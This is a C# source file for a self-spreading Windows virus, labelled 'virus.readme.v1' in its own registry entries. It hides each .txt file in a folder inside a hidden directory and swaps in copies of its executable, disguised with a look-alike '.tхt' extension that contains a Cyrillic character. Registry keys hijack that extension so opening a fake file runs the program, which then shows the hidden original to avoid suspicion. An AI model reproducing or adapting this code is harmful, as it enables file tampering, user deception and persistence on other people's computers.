using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Microsoft.Win32;

namespace README
{
    class Program
    {

        [STAThread]
        static void Main(string[] args)
        {

            var pathToOriginal = System.AppDomain.CurrentDomain.BaseDirectory;
            var pathToHidden = Path.Combine(pathToOriginal, ".Hidden");

            if (args.Length > 0)
            {
                String[] path = args[0].Split('\\');
                String file = path.Last().Replace(".tхt", ".txt");
                pathToOriginal = "";
                for (int i = 0; i < path.Length - 1; i++)
                {
                    pathToOriginal += String.Concat(path[i], "\\");
                }
                pathToHidden = Path.Combine(pathToOriginal, ".Hidden");
            }


            if (!Directory.Exists(pathToHidden))
            {
                DirectoryInfo di = Directory.CreateDirectory(pathToHidden);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }

            List<string> Files = new List<string>(Directory.GetFiles(pathToOriginal));
            List<string> TxTFiles = new List<string>();

            for (int i = 0; i < Files.Count; i++)
            {
                if (Files[i].EndsWith(".txt"))
                {
                    TxTFiles.Add(Files[i]);
                }
            }

            var exeName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            if (!File.Exists(Path.Combine(pathToOriginal, exeName)))
            {
                File.Copy(args[0], Path.Combine(pathToOriginal, exeName));
            }
            List<string> NamesTxt = new List<string>();

            foreach (var item in TxTFiles)
            {
                var Name = Path.GetFileName(item);
                NamesTxt.Add(Name);
                var _Path = Path.GetDirectoryName(item);
                File.Copy(item, Path.Combine(pathToHidden, Name), true);
                File.Delete(item);
                string FixedName = Name.Replace(".txt", "");
                File.Copy(exeName, Path.Combine(_Path, FixedName + ".tхt"));
            }
            RegistryKey myKey = Registry.ClassesRoot.OpenSubKey(".tхt", true);
            if (myKey == null)
            {
                myKey = Registry.ClassesRoot.CreateSubKey(".tхt\\DefaultIcon");
                myKey.SetValue("", Path.Combine(pathToOriginal, exeName));
            }
            myKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\.tхt", true);
            if (myKey == null)
            {
                myKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\.tхt");
                myKey.SetValue("", "virus.readme.v1");
                myKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\virus.readme.v1\\shell\\open\\command");
                myKey.SetValue("", String.Concat(Path.Combine(pathToOriginal, exeName), " \"%1\""));
            }
            else
            {
                myKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\virus.readme.v1\\shell\\open\\command");
                String path = myKey.GetValue("").ToString();
                path = path.Substring(0, path.Length - 5);
                if (!File.Exists(path))
                {
                    if (args.Length > 0)
                        File.Copy(args[0], path);
                    else
                        File.Copy(exeName, path);
                }
            }
            myKey.Close();

            var findTxt = Path.GetFileName(exeName);
            findTxt = findTxt.Replace(".exe", ".txt");
            var exePath = Path.Combine(pathToHidden, findTxt);

            if (File.Exists(exePath))
            {
                Process.Start(exePath);
            }
            else if (args.Length > 0)
            {
                Process.Start(Path.Combine(pathToHidden, args[0].Split('\\').Last().Replace(".tхt", ".txt")));
            }
        }

    }
}
